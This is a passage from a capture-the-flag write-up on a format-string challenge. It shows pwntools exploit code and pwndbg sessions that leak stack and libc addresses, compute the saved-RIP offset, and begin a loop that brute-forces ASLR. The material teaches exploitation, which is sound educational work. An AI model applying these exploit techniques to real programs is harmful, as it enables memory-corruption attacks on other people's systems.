</span><span style="--0:#032F62;--1:#9ECBFF">&#39;$&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> val: </span><span style="--0:#BF3441;--1:#F97583">continue</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">        </span><span style="--0:#005CC5;--1:#79B8FF">print</span><span style="--0:#24292E;--1:#E1E4E8">(val[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">:])</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">        </span><span style="--0:#005CC5;--1:#79B8FF">print</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8">pos</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">: </span><span style="--0:#005CC5;--1:#79B8FF">{int</span><span style="--0:#24292E;--1:#E1E4E8">(val[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">:]) </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">FFFFFFFF}</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *exe = context.binary = ELF(args.EXE or './chall')libc = ELF(exe.libc.path)def send(arguments, fmt):    io.sendlineafter(b&#34;# of args: &#34;, str(len(arguments)).encode())    for i in range(len(arguments)): io.sendlineafter(f&#34;[{i}]: &#34;.encode(), str(arguments[i]).encode())    io.sendlineafter(b&#34;string: &#34;, fmt)io = process()for i in range(10):    send(        [1, 2, 3, 4],        f&#34;|%*{(i*4)}$||%*{(i*4)+1}$||%*{(i*4)+2}$||%*{(i*4)+3}$&#34;.encode()    )    io.recvuntil(b&#34;|&#34;)    for pos, val in enumerate(io.recvline().split(b'\n')[0].decode().split(&#34;||&#34;)):        if '$' in val: continue        print(val[1:])        print(f&#34;{(i*4)+pos}: {int(val[1:]) &#38; 0xFFFFFFFF}&#34;)"><div></div></button></div></figure></div>
<p><img src="/other-files/leaks.CXq-wgT5_2dW6m5.webp" alt width="1074" height="365" loading="lazy" decoding="async"></p>
<p>We can verify this by attaching <code>gdb</code> to the process and taking the upper 32 bits from <code>vmmap</code> and join it with the lower 32-bits that we leak to see if it’s a valid address.</p>
<p>To do this add the following lines to the script:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:16ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">gdb.attach(io)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="gdb.attach(io)io.interactive()"><div></div></button></div></figure></div>
<p>Running the modified script attaches gdb to the running process and launches the debugger window.</p>
<p><img src="/other-files/leak-dbg.7qm5kQ2i_Z1nb7Tv.webp" alt width="1920" height="812" loading="lazy" decoding="async"></p>
<p>Here <code>0x00007ffc</code> is the upper 32 bits while <code>0x85af49b8</code> is the lower 32 bits being leaked at position 7 (<code>%*7$</code>). Using gdb we confirmed that the reconstructed address (<code>0x7ffc85af49b8</code>) is a valid stack address.</p>
<p>In the upper 32 bits of stack addresses only one nibble changes across runs—the last one. So the upper 32 bits look like <code>0x00007ff[0-f]</code> where <code>[0-f]</code> represents the nibble that changes.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="text" class="wrap" style="--ecMaxLine:37ch"><code><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">┌─────────────────┬─────────────────┐</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">│  Upper 32 bits  │  Lower 32 bits  │</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">│   0x00007ff[?]  │   0x85af49b8    │</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">└─────────────────┴─────────────────┘</span></div></div><div class="ec-line" style="--ecIndent:5ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">     </span></span><span style="--0:#24292e;--1:#e1e4e8">^                    ^</span></div></div><div class="ec-line" style="--ecIndent:5ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">     </span></span><span style="--0:#24292e;--1:#e1e4e8">|                    |</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">1 nibble varies    Leaked via %*7$</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">(1/16 chance)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="┌─────────────────┬─────────────────┐│  Upper 32 bits  │  Lower 32 bits  ││   0x00007ff[?]  │   0x85af49b8    │└─────────────────┴─────────────────┘     ^                    ^     |                    |  1 nibble varies    Leaked via %*7$  (1/16 chance)"><div></div></button></div></figure></div>
<p>Let’s find the offset of the saved rip from this leaked address. We can do this by setting a breakpoint at the last instruction of <code>main()</code>, which is the <code>ret</code>.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:54ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">p</span><span style="--0:#24292E;--1:#E1E4E8"> &amp;</span><span style="--0:#6F42C1;--1:#B392F0">main</span></div></div><div class="ec-line"><div class="code"><span style="--0:#AE4B07;--1:#FFAB70">$4</span><span style="--0:#24292E;--1:#E1E4E8"> = (</span><span style="--0:#6F42C1;--1:#B392F0">&lt;data</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">variable,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">no</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">debug</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">info&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#24292E;--1:#E1E4E8">) 0x55ac4edb8160</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">b</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">0x55ac4edb8160+291</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Breakpoint</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x55ac4edb8283</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt;  </span><span style="--0:#032F62;--1:#9ECBFF">x/i</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x55ac4edb8283</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x55ac4edb8283:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">ret</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt;  </span><span style="--0:#032F62;--1:#9ECBFF">c</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> p &#38;main$4 = (<data variable, no debug info> *) 0x55ac4edb8160pwndbg> b *0x55ac4edb8160+291Breakpoint 1 at 0x55ac4edb8283pwndbg>  x/i 0x55ac4edb8283   0x55ac4edb8283:      retpwndbg>  c"><div></div></button></div></figure></div>
<p>Send <code>-</code> as input when it asks for the number of arguments. This makes <code>scanf()</code> error out and the code returns:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:37ch"><code><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get arguments */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">n_args</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="    /* Get arguments */    printf(&#34;# of args: &#34;);    if (scanf(&#34;%lu&#34;, &#38;n_args) != 1) {      return 1;    }"><div></div></button></div></figure></div>
<p>The program stops at the breakpoint which in this case is <code>ret</code> instruction:</p>
<p><img src="/other-files/finding-rip-offset-from-leak.FemJFR_U_Z2aOF96.webp" alt width="1920" height="825" loading="lazy" decoding="async"></p>
<p>Now let’s examine the saved frame and calculate the offset of saved RIP from our leak:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:139ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">i</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">f</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Stack</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">level</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">frame</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7ffc85af4b30:</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">rip</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x55ac4edb8283</span><span style="--0:#24292E;--1:#E1E4E8">; </span><span style="--0:#6F42C1;--1:#B392F0">saved</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">rip</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x7f9165e2a1ca</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">called</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">by</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">frame</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x7ffc85af4bd0</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">Arglist</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7ffc85af4b20,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">args:</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">Locals</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7ffc85af4b20,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Previous</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">frame&#39;s sp is 0x7ffc85af4b30</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF"> </span></span><span style="--0:#032F62;--1:#9ECBFF">Saved registers:</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">  </span></span><span style="--0:#032F62;--1:#9ECBFF">rbx at 0x7ffc85af4af8, rbp at 0x7ffc85af4b00, r12 at 0x7ffc85af4b08, r13 at 0x7ffc85af4b10, r14 at 0x7ffc85af4b18, r15 at 0x7ffc85af4b20,</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">  </span></span><span style="--0:#032F62;--1:#9ECBFF">rip at 0x7ffc85af4b28</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">pwndbg&gt; printf &quot;0x%x\n&quot;, 0x7ffc85af4b28-0x7ffc85af49b8</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">0x170</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> i fStack level 0, frame at 0x7ffc85af4b30: rip = 0x55ac4edb8283; saved rip = 0x7f9165e2a1ca called by frame at 0x7ffc85af4bd0 Arglist at 0x7ffc85af4b20, args: Locals at 0x7ffc85af4b20, Previous frame's sp is 0x7ffc85af4b30 Saved registers:  rbx at 0x7ffc85af4af8, rbp at 0x7ffc85af4b00, r12 at 0x7ffc85af4b08, r13 at 0x7ffc85af4b10, r14 at 0x7ffc85af4b18, r15 at 0x7ffc85af4b20,  rip at 0x7ffc85af4b28pwndbg> printf &#34;0x%x\n&#34;, 0x7ffc85af4b28-0x7ffc85af49b80x170"><div></div></button></div></figure></div>
<p>So, the saved rip is at +0x170 offset from our leak.</p>
<p>The saved rip here is an address in libc (+0x2a1ca), so if we read the rip we can get a libc leak:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:95ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">x/gx</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x7ffc85af4b28</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">0x7ffc85af4b28:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x00007f9165e2a1ca</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">x/i</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x00007f9165e2a1ca</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x7f9165e2a1ca:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">edi,eax</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">vmmap</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x00007f9165e2a1ca</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">LEGEND:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">STACK</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">HEAP</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">CODE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">DATA</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">WX</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">RODATA</span></div></div><div class="ec-line" style="--ecIndent:13ch"><div class="code"><span class="indent">             </span><span style="--0:#6F42C1;--1:#B392F0">Start</span><span style="--0:#24292E;--1:#E1E4E8">                </span><span style="--0:#032F62;--1:#9ECBFF">End</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Perm</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">Size</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#032F62;--1:#9ECBFF">Offset</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">File</span><span style="--0:#24292E;--1:#E1E4E8"> (set </span><span style="--0:#032F62;--1:#9ECBFF">vmmap-prefer-relpaths</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">on</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">0x7f9165e00000</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0x7f9165e28000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">r--p</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">28000</span><span style="--0:#24292E;--1:#E1E4E8">       </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libc.so.6</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">►</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">0x7f9165e28000</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0x7f9165fb0000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">r-xp</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">188000</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">28000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">+0x21ca</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">0x7f9165fb0000</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0x7f9165fff000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">r--p</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">4f000</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#032F62;--1:#9ECBFF">1b0000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libc.so.6</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">printf</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;0x%x\n&quot;,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x00007f9165e2a1ca-0x7f9165e00000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">0x2a1ca</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> x/gx 0x7ffc85af4b280x7ffc85af4b28: 0x00007f9165e2a1capwndbg> x/i 0x00007f9165e2a1ca   0x7f9165e2a1ca:      mov    edi,eaxpwndbg> vmmap 0x00007f9165e2a1caLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)    0x7f9165e00000     0x7f9165e28000 r--p    28000       0 libc.so.6►   0x7f9165e28000     0x7f9165fb0000 r-xp   188000   28000 libc.so.6 +0x21ca    0x7f9165fb0000     0x7f9165fff000 r--p    4f000  1b0000 libc.so.6pwndbg> printf &#34;0x%x\n&#34;, 0x00007f9165e2a1ca-0x7f9165e000000x2a1ca"><div></div></button></div></figure></div>
<p>This also tells us if our nibble guess is correct—if the address is wrong the program will segfault. We can wrap this in a while-true loop with try-except to keep retrying until we get a successful leak:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:93ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">try</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> process()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">send([</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;%*7$&quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode())</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">rip </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ((</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">7fff</span><span style="--0:#BF3441;--1:#F97583">&lt;&lt;</span><span style="--0:#005CC5;--1:#79B8FF">32</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().decode().strip()[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">:]) </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">FFFFFFFF</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">170</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
